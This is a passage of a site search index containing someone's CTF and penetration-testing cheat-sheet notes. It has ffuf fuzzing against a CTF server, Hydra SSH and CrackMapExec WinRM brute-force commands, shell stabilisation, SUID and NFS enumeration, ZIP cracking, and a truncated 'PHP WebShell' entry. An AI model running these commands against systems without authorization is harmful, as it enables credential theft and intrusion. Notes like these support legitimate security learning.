\u0026#34;X-Token: 492E64385D3779BC5F040E2B19D67742\u0026#34; -H \u0026#34;Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnVPVEl4WVdsb2VpSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiI3NGNlM2EzYzk4YTg4ZjgwZWU2NjZjNWNhYWNlMjlhMSJ9\u0026#34; -u http://server.vulnbegin.co.uk/user/FUZZ -mc all -fc 404 CrackMapExec\u003e CrackMapExec # This package is a swiss army knife for pentesting Windows/Active Directory environments.\ncrackmapexec winrm REMOTE_IP -u /PATH/TO/USERNAMES/WORDLIST_OR_SINGLE_USERNAME -p /PATH/TO/PASSWORDS/WORDLIST_OR_SINGLE_PASSWORD Hydra\u003e Hydra # Hydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add. This tool makes it possible for researchers and security consultants to show how easy it would be to gain unauthorized access to a system remotely.\nBrute-forcing SSH with HYDRA.\nhydra -l USERNAME -P /PATH/TO/PASSWORD/WORDLIST ssh://REMOTE_IP:22 -t 4 -V An Easy Way To Stabilize a Shell\u003e An Easy Way To Stabilize a Shell # import /dev/null -c bash *Ctrl+Z* stty raw -echo; fg reset xterm export TERM=xterm export SHELL=bash ","date":"7 January 2023","permalink":"/posts/notes/linux/linux-notes/","section":"Posts","summary":"View Cron Jobs\u003e View Cron Jobs # crontab -l List Scheduled Processes/Tasks/Scripts\u003e List Scheduled Processes/Tasks/Scripts # systemctl list-timers View NFS (Network File Share)\u003e View NFS (Network File Share) # showmount REMOTE_IP -e Mount NFS\u003e Mount NFS # mount -t nfs REMOTE_IP:/PATH/TO/NFS/SHARE /LOCAL/PATH/TO/MOUNT Crack ZIP Files\u003e Crack ZIP Files # fcrackzip -u -D -p /PATH/TO/WORDLIST ZIP_FILE Find SUID Binaries\u003e Find SUID Binaries # find / -type f -perm -4000 2\u0026gt;/dev/null PHP WebShell\u003e PHP WebShell # \u0026lt;?","title":"Linux"},{"content":"","date":"1 January 0001","permalink":"/authors/","section":"Authors","summary":"","title":"Authors"},{"content":"","date":"1 January 0001","permalink":"/categories/","section":"Categories","summary":"","title":"Categories"},{"content":"","date":"1 January 0001","permalink":"/series/","section":"Series","summary":"","title":"Series"}]